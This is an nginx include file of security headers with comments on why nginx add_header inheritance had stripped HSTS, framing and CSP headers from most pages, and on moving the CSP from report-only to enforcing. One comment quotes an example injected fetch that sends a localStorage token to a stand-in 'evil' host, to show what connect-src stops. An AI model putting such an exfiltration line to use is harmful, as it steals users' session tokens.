# Security headers, in an include so every location can repeat them.
#
# nginx's add_header does not merge across levels: the moment a location adds
# a header of its own, every add_header inherited from the server block is
# dropped. Six locations here set their own Cache-Control, and that silently
# stripped HSTS, X-Frame-Options, Referrer-Policy, Permissions-Policy and the
# CSP from every HTML page and every static asset — only /api/ responses, the
# one branch that adds no header of its own, still carried them. The pages
# that most need clickjacking and transport protection (/login, /pay,
# /dashboard) were the ones going out bare.
#
# Keep this file the single source of truth and include it in any location
# that calls add_header, so the headers survive.
add_header X-Frame-Options "SAMEORIGIN" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-XSS-Protection "1; mode=block" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
add_header Permissions-Policy "camera=(), microphone=(), geolocation=(), payment=(self)" always;
# ─── Content Security Policy ─────────────────────────────────
# Enforcing now. It spent long enough in report-only that nothing was being
# blocked at all — which is the same as having no policy.
#
# Every origin below is one the site actually loads today; a missed one means a
# silently broken feature, so the list was built from the source rather than
# from memory:
#   player.vdocipher.com   lesson player (api.js AND the iframe)
#   iframe.mediadelivery.net, *.b-cdn.net   Bunny video (legacy lessons, VSLs)
#   fast.wistia.net        review videos
#   cdn.plyr.io            home-page player
#   cdn.tailwindcss.com    register / privacy
#   cdn.jsdelivr.net       Chart.js on the team dashboard
#   ipapi.co               country pre-fill on signup
#   *.supabase.co          purchase ticker on the landing page
# The previous policy named none of the first six, so flipping it as it stood
# would have taken out video playback everywhere.
#
# script-src still carries 'unsafe-inline'. Removing it is the remaining work:
# the site has inline <script> blocks and inline onclick= handlers across 29
# pages, and dropping it without moving those first would blank the site. What
# enforcement buys even with it present is the exfiltration half — connect-src
# means an injected fetch('//evil/' + localStorage.token) does not leave the
# browser, and script-src blocks pulling in a remote payload.
#
# The report-only header alongside is the NEXT policy, without 'unsafe-inline'.
# Watch its reports to find every inline block that has to move, then swap it in.
add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline' https://accounts.google.com https://payments.kashier.io https://challenges.cloudflare.com https://www.googletagmanager.com https://www.google-analytics.com https://connect.facebook.net https://www.clarity.ms https://*.clarity.ms https://player.vdocipher.com https://cdn.plyr.io https://cdn.tailwindcss.com https://cdn.jsdelivr.net; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdn.plyr.io; img-src 'self' data: blob: https:; font-src 'self' https://fonts.gstatic.com data:; media-src 'self' blob: https://*.b-cdn.net https://player.vdocipher.com https://fast.wistia.net; connect-src 'self' wss: blob: https://accounts.google.com https://challenges.cloudflare.com https://www.googletagmanager.com https://www.google-analytics.com https://*.google-analytics.com https://*.analytics.google.com https://connect.facebook.net https://www.facebook.com https://*.clarity.ms https://c.bing.com https://player.vdocipher.com https://*.vdocipher.com https://ipapi.co https://*.supabase.co https://*.b-cdn.net https://fast.wistia.net; frame-src https://payments.kashier.io https://accounts.google.com https://challenges.cloudflare.com https://www.googletagmanager.com https://player.vdocipher.com https://iframe.mediadelivery.net https://fast.wistia.net https://www.youtube.com https://youtube.com; frame-ancestors 'none'; object-src 'none'; base-uri 'self'; form-action 'self' https://payments.kashier.io" always;
add_header Content-Security-Policy-Report-Only "default-src 'self'; script-src 'self' https://accounts.google.com https://payments.kashier.io https://challenges.cloudflare.com https://www.googletagmanager.com https://www.google-analytics.com https://connect.facebook.net https://www.clarity.ms https://*.clarity.ms https://player.vdocipher.com https://cdn.plyr.io https://cdn.tailwindcss.com https://cdn.jsdelivr.net; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdn.plyr.io; img-src 'self' data: blob: https:; font-src 'self' https://fonts.gstatic.com data:; media-src 'self' blob: https://*.b-cdn.net https://player.vdocipher.com https://fast.wistia.net; connect-src 'self' wss: blob: https://accounts.google.com https://challenges.cloudflare.com https://www.googletagmanager.com https://www.google-analytics.com https://*.google-analytics.com https://*.analytics.google.com https://connect.facebook.net https://www.facebook.com https://*.clarity.ms https://c.bing.com https://player.vdocipher.com https://*.vdocipher.com https://ipapi.co https://*.supabase.co https://*.b-cdn.net https://fast.wistia.net; frame-src https://payments.kashier.io https://accounts.google.com https://challenges.cloudflare.com https://www.googletagmanager.com https://player.vdocipher.com https://iframe.mediadelivery.net https://fast.wistia.net https://www.youtube.com https://youtube.com; frame-ancestors 'none'; object-src 'none'; base-uri 'self'; form-action 'self' https://payments.kashier.io" always;
